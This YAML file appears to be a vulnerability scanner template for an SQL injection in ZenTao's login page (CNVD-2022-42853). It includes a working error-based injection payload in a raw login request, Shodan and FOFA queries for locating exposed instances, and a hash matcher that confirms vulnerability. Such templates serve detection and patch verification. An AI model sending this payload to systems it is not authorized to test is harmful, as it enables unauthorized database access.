id: CNVD-2022-42853
info:
  name: ZenTao CMS - SQL Injection
  author: ling
  severity: critical
  description: A SQL injection vulnerability in ZenTao CMS allows attackers to potentially
    access sensitive data, modify information, and execute unauthorized administrative
    actions.
  reference:
  - https://github.com/z92g/ZentaoSqli/blob/master/CNVD-2022-42853.go
  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-42853
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    shodan-query: http.title:"zentao"
    fofa-query: Zentao
    impact: The SQL injection vulnerability in ZenTao CMS has the potential to allow
      an attacker to access sensitive information, manipulate data, and carry out
      unauthorized administrative operations on the affected website.
    recommendation: It is recommended that users of ZenTao CMS update their software
      immediately to address the SQL injection vulnerability and prevent potential
      data breaches.
  tags: cnvd,cnvd2022,zentao,sqli
variables:
  num: '999999999'
requests:
- raw:
  - 'POST /zentao/user-login.html HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}/zentao/user-login.html


    account=admin''+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+''1''=''1

    '
  matchers:
  - type: word
    part: body
    words:
    - c8c605999f3d8352d7bb792cf3fdb25
